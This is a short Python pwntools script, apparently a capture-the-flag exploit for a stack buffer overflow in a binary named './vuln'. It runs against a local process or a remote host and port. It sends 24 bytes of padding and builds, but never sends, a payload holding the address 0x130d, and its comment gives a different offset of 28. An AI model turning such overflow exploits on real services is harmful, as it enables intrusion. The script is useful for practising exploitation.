#python3
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)


exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

sh = start()

offset = b'A' * 24 # EIP -> 28

p = flat([
    offset,
    0x130d
])

sh.sendlineafter(': ', offset)

sh.interactive()
